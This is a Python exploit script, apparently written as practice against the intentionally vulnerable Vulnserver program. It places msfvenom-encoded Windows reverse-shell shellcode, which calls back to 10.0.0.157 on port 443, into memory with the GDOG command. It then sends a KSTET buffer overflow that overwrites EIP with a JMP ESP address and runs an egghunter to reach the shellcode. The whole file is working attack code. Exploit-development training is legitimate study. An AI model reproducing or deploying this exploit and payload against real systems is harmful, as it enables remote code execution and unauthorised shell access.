#!/usr/bin/python3

import socket

# msfvenom --platform windows -a x86 -p windows/shell_reverse_tcp LHOST=10.0.0.157 LPORT=443 EXITFUNC=thread -e x86/shikata_ga_nai -i 3 -b "\x00" -f python
buf =  b""
buf += b"\xbb\x0e\x84\x82\x29\xdb\xd3\xd9\x74\x24\xf4\x58\x29"
buf += b"\xc9\xb1\x5f\x83\xe8\xfc\x31\x58\x10\x03\x58\x10\xec"
buf += b"\x71\x5b\xed\x4e\x98\x28\xe1\xa4\x82\xa5\xd9\x4c\x6e"
buf += b"\x75\xeb\x1d\xd7\xfa\x01\xa1\xd9\x8e\xc3\x5a\x68\x79"
buf += b"\x0e\x48\x45\x15\x16\x28\xd0\x60\x93\x75\x44\x20\xea"
buf += b"\xe2\x17\x5d\x05\x29\x46\x81\x6c\xdb\x8a\x5e\xf0\x82"
buf += b"\xd5\x17\xcf\x20\x8d\x87\xbe\x1b\xef\x1f\x6b\x20\x21"
buf += b"\xd4\x52\x0c\x24\xa4\xa4\x0b\xc4\x7b\x2c\x7b\x3a\x99"
buf += b"\xe9\x39\x60\x49\xba\x0c\x48\x7e\xfa\x51\xc4\x0d\x93"
buf += b"\x4e\x90\x86\x36\x16\x64\xf8\xd2\x61\x27\xfe\x33\xf5"
buf += b"\x7a\x0b\x54\xf7\x8b\xdc\x9c\x64\x98\x26\x42\xd5\x16"
buf += b"\x0d\x9f\xc9\xeb\xda\xa0\xf0\x5f\xb3\x5b\x5b\x7f\x4d"
buf += b"\x23\x8e\xdd\xc1\x0e\xdc\x8e\x3d\xf0\x2c\x35\x52\xdc"
buf += b"\x36\x08\x2b\x4b\xc9\xf4\x62\xb4\xcf\x96\x56\x2b\x3a"
buf += b"\xa7\xc6\xa2\xa3\x47\x03\x50\x70\xc5\xc2\x9c\xb2\x99"
buf += b"\x3b\x30\xb7\x57\x7c\xd0\xa5\x22\xe8\x92\xaf\x1a\xb2"
buf += b"\xf7\x7d\x52\x1f\xdb\x44\x1f\x2f\x06\xfd\xbd\xb1\xcc"
buf += b"\x46\x09\x0e\x7a\xf0\xe9\x73\xe4\x41\x67\xfd\xf9\x5c"
buf += b"\x6a\x51\x5e\x0d\x03\xcf\xcb\x1d\x3f\xe8\x68\x10\xe1"
buf += b"\x70\x66\x64\x61\x83\x7a\x67\xb4\x58\xfd\x57\x05\x12"
buf += b"\x17\x5c\x22\x22\x95\x67\x4e\x2e\xc2\x83\x21\xc3\x10"
buf += b"\xb0\x78\x95\xf1\x48\x4c\x9f\x2b\xaf\x1f\xff\x73\x10"
buf += b"\x55\xcd\x2b\x0f\xa7\x1b\xc1\xa9\xb4\x05\xff\x91\x4d"
buf += b"\x35\xe8\xa3\x39\x68\xa3\x5d\x62\x05\x95\xd7\x67\x08"
buf += b"\x36\xe9\xb1\x5c\x34\x84\xce\x86\xad\x2e\x6a\xa9\x2d"
buf += b"\x67\x1e\x25\x84\x85\x7c\x66\xe9\x7b\x21\x8d\xc4\x61"
buf += b"\xa6\x15\x63\xab\xd6\x1a\x4e\xbf\x21\xdf\x68\x23\xe7"
buf += b"\x0c\x1e\x1f\x8a\x44\x0e\xf5\x0d\x48\x2d\x65\xde\x4d"
buf += b"\xd7\xe4\xb8\xe8\x13\xed\x76\x3c\x58\xab\xa3\xb2\x58"
buf += b"\x64\xdd\x7c\x68\xa3\x47\x33\xbd\x7b\x48\xa4\x31\x2e"
buf += b"\x75\x01\x08\xcb\x7a\xaa\x3b\x8f\x1c\x71\xc3\xaa\x8a"
buf += b"\x75\xb3"

# Egg is H@CK, egghunter is 32 bytes total
egghunter = b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x48\x40\x43\x4b\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
buffer = b"\x90" * 10
buffer += egghunter
buffer += b"\x90" * (65 - len(buffer))
buffer += b"\xAF\x11\x50\x62" # JMP ESP in essfunc.dll
buffer += b"\xEB\xBE" # Short jump back into larger buffer space before EIP overwrite
buffer += b"\x90" * (100 - len(buffer))

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(("10.0.0.192",9999))
banner = s.recv(1024)
print(banner.decode())

egg = b"\x48\x40\x43\x4B"

shellcode = "GDOG ".encode() + bytearray(egg + egg + b"\x90" * 10 + buf)

# We now send the shellcode with the "GDOG" command which will not crash the program but will get our shellcode into memory somewhere.

s.send(shellcode)
response = s.recv(1024)
print(response.decode())

exploit = "KSTET /.:/ ".encode() + bytearray(buffer) + "\r\n".encode()

# This is the actual exploit packet, intended to hijack EIP and redirect execution to egghunter, which will find our egg in memory and jmp to the shellcode succeeding it.

s.send(exploit)
response = s.recv(1024)
print(response.decode())
s.close()
